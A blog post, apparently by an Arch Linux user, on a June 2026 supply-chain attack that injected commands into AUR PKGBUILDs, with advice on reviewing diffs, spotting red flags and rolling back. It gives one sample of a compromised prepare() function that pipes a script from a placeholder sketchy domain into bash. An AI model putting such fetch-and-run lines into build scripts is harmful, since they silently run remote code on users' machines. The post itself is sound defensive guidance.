---
title: "Protecting Yourself from Malicious AUR Packages"
date: 2026-06-12
lastmod: 2026-06-12
description: "On June 11, 2026, malicious actors pushed compromised PKGBUILDs to multiple AUR packages. Here's what happened, why it matters, and how to protect yourself."
summary: "Supply-chain attacks hit the AUR. Here's what happened and how to protect yourself."
tags: ["linux", "arch", "security", "aur", "pkgbuild", "supply-chain"]
categories: ["security"]
author: Nimendra
showtoc: true
TocOpen: true
ShowReadingTime: true
ShowPostNavLinks: true
ShowBreadCrumbs: true
ShowCodeCopyButtons: true

editPost:
  URL: "https://github.com/nmdra/nmdra.github.io/tree/main/content"
  Text: "Suggest edit"
  appendFilePath: true
---

On June 11, 2026, malicious actors compromised multiple AUR packages by injecting arbitrary shell commands into PKGBUILDs. If you ran `yay -Syu` that day without reviewing changes, you may have been affected. Here's what happened and how to make sure it doesn't happen again.

## What Happened?

On June 11, 2026, a coordinated malware campaign was detected targeting multiple user-contributed packages on the **Arch Linux AUR (Arch User Repository)**. The AUR team quickly put out a report thread and started working to reset and delete malicious commits while banning the responsible accounts.[^aur-thread]

Compromised accounts, or malicious contributors who had gained maintainer access, simply *pushed updates*. Normal-looking package updates. The kind that get auto-applied by thousands of Arch users every day with a quick `yay -Syu` before breakfast.

{{<figure src="/images/yay.webp" caption="A routine system upgrade — the exact moment a malicious PKGBUILD would execute" alt="Terminal output of yay AUR helper performing a system upgrade" width="60%" height="auto" align="center" >}}

## What the Attack Actually Did

The attack vector was the **PKGBUILD file**. Malicious commits injected arbitrary bash commands directly into PKGBUILDs. These commands execute during installation, which means the moment you run `makepkg -si` or let your AUR helper do it for you, the payload fires.

And the payload? The compromised PKGBUILDs downloaded and executed malicious packages, npm dependencies, or scripts completely unrelated to the software being installed.

## Wait, What Even Is a PKGBUILD?

If you're not deep into Arch-land, here's the short version: a PKGBUILD is a Bash script that tells `makepkg` how to build and install a package. It defines the source files, checksums, dependencies, and the actual installation steps.

Here's a clean, legitimate example from `pi-coding-agent`:

```bash
pkgname=pi-coding-agent
pkgver=0.79.1
pkgrel=1
pkgdesc='A terminal-based coding agent with multi-model support, mid-session model switching, and a simple CLI for headless coding tasks'
arch=('x86_64' 'aarch64')
url='https://pi.dev/'
license=('MIT')
options=(!debug !strip)
source_x86_64=("pi-linux-$pkgver.tar.gz::https://github.com/earendil-works/pi/releases/download/v$pkgver/pi-linux-x64.tar.gz")
sha256sums_x86_64=("dc19d2b24d15c76951fe440a47a8212cedb437a25696ebf27a55481156de9e86")
source_aarch64=("pi-linux-$pkgver.tar.gz::https://github.com/earendil-works/pi/releases/download/v$pkgver/pi-linux-arm64.tar.gz")
sha256sums_aarch64=("a191a0c8d57abf1424c560f53981c2a070f74d2863a47a7958eb16c556c4bc04")
noextract=("pi-linux-$pkgver.tar.gz")
makedepends=("tar")
package() {
    mkdir -p "$srcdir/pi-linux-$pkgver"
    tar xCf "$srcdir/pi-linux-$pkgver" "pi-linux-$pkgver.tar.gz"
    install -d "$pkgdir/opt"
    cp -dr --no-preserve=ownership "$srcdir/pi-linux-$pkgver/pi" "$pkgdir/opt/pi-coding-agent"
    install -d "$pkgdir/usr/bin"
    ln -s ../../opt/pi-coding-agent/pi "$pkgdir/usr/bin/pi"
    cd "$pkgdir/opt/pi-coding-agent"
    install -Dm644 README.md CHANGELOG.md -t "$pkgdir/usr/share/doc/$pkgname"
}
```

Notice what it *doesn't* do: it doesn't curl random scripts, it doesn't pull in sketchy npm packages, and it doesn't run commands unrelated to installing the actual software. That's what a healthy PKGBUILD looks like.

A compromised one might slip in something like:

```bash
prepare() {
    curl -s https://some-sketchy-domain.com/payload.sh | bash
    npm install -g atomic-lockfile
}
```

And if you're just blindly running `yay -Syu`, you'd never know.

## How to Actually Protect Yourself

Most Arch users reach for `yay` or `paru` as their AUR helper of choice. Both have review features built in, but they're not always enabled by default. The commands below use `yay` — for `paru`, replace `yay` with `paru` as the flags are identical.

### Enable Review Menus

Before your next upgrade, run this:

```bash
yay --editmenu --diffmenu
```

This will:
1. Show you the **diff** (`diffmenu`) between the old and new PKGBUILD, so you can see exactly what changed.
2. Let you **open and inspect** the full PKGBUILD (`editmenu`) before anything gets built.

For a full system upgrade with review enabled:

```bash
yay -Syu --editmenu --diffmenu
```

You really want this on all the time. Save it as a permanent default with:

```bash
yay --save --editmenu --diffmenu
```

### Inspect Without Installing

Want to look at a PKGBUILD before committing to anything? Pull the package repo down without installing — `yay -G` clones the AUR git repository into a new folder in your **current directory**:

```bash
yay -G package-name
cd package-name
less PKGBUILD
```

Or just `cat PKGBUILD` if you prefer. Either way, nothing gets built or installed.

### What to Look For When You Review

When you're skimming a PKGBUILD, watch for the following red flags:

- Unexpected `curl`, `wget`, or piping anything into `bash` or `sh`
- New dependencies you don't recognize (especially anything npm or pip related)
- Changes to `source=()` URLs pointing to unfamiliar domains
- Suspicious commands buried in `prepare()`, `build()`, or `package()` functions
- New `*.install` scripts that weren't there before

## If You Think You've Already Been Hit

Maybe you ran a system upgrade before you saw this post. Here's how to roll back an AUR package to a known-good version.

### Pull the Package History

```bash
yay -G package-name
cd package-name
git log --oneline
```

Find a commit before the suspicious change and check it out:

```bash
git checkout <commit-hash>
makepkg -si
```

### Or Rebuild from Cache

If `yay` already downloaded and built the package previously, your cache might still have the old sources:

```bash
ls ~/.cache/yay/package-name/
```

If the old tarball is still there, copy it into a working directory and rebuild without pulling anything new from the internet:

```bash
cp ~/.cache/yay/package-name/package-name-<version>.tar.gz .
tar xf package-name-<version>.tar.gz
cd package-name-<version>
makepkg -si
```

## Closing Thoughts

The AUR's power comes from its community. That same openness is exactly what makes it a target. Reviewing PKGBUILDs isn't paranoia, it's the intended workflow. The AUR has always carried a warning: *use at your own risk*. Events like this are a reminder that the warning is real.

[^aur-thread]: The official AUR report thread with details on affected packages: [AUR REPORT THREAD — aur-general mailing list](https://lists.archlinux.org/archives/list/aur-general@lists.archlinux.org/thread/FGXPCB3ZVCJIV7FX323SBAX2JHYB7ZS4/)
